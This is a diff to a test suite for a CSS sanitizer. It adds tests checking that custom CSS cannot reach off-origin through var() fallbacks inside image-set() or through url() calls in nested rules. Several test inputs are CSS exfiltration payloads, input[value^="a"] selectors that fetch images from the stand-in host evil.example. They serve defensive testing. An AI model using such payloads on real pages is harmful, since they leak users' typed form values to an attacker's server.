@@ -148,8 +148,13 @@ describe("sanitizeBlockCss", () => {
   });
 
   it("does not double-scope a selector already prefixed with the block class", () => {
-    const out = cleanBlock("selector { color: red; }", "nx-pb-abc");
+    // Written with the class already at the front, which is what the
+    // already-scoped branch actually looks for. Passing `selector { … }` here
+    // exercised the keyword rewrite instead and would have passed whether or
+    // not that branch existed.
+    const out = cleanBlock(".nx-pb-abc .title { color: red; }", "nx-pb-abc");
     expect(out).not.toMatch(/\.nx-pb-abc\s+\.nx-pb-abc/);
+    expect(out).toContain(".nx-pb-abc .title");
   });
 });
 
@@ -271,6 +276,46 @@ describe("custom CSS may not reach off this origin", () => {
         SCOPE
       ).css
     ).not.toContain("evil.example");
+  });
+
+  it("reads a URL substituted into a URL-taking function", () => {
+    // `var()` is transparent: its fallback becomes whatever encloses the
+    // `var()`, so this fetches even though the string's nearest function is
+    // `var`. Position is decided by the nearest function that is NOT a
+    // substitution.
+    const out = sanitizeCustomCss(
+      `input[value^="a"] { background-image: image-set(var(--missing, "https://evil.example/a.png") 1x) }`,
+      SCOPE
+    );
+    expect(out.css).not.toContain("evil.example");
+    expect(out.warnings.map(w => w.code)).toContain("remote-url");
+    // The same transparency must NOT make a caption's fallback a URL.
+    expect(
+      sanitizeCustomCss(
+        `.a { content: var(--label, "https://example.com") }`,
+        SCOPE
+      ).warnings
+    ).toEqual([]);
+  });
+
+  it("reads inside a nested rule, at any depth", () => {
+    // css-tree leaves a nested rule as a `Raw` child of its parent's block, so
+    // a declaration-only walk never sees the URL inside it.
+    for (const css of [
+      `input[value^="a"] { .probe { background: url("https://evil.example/a") } }`,
+      `.a { .b { .c { background: url("https://evil.example/a") } } }`,
+    ]) {
+      const out = sanitizeCustomCss(css, SCOPE);
+      expect(out.css).not.toContain("evil.example");
+      expect(out.warnings.map(w => w.code)).toContain("remote-url");
+    }
+    // And an ordinary nested rule survives untouched, at either depth.
+    for (const css of [
+      `.a { .nested { color: red } }`,
+      `.a { .b { .c { color: red } } }`,
+    ]) {
+      expect(sanitizeCustomCss(css, SCOPE).warnings).toEqual([]);
+    }
   });
 
   it("leaves an ordinary fallback alone", () => {
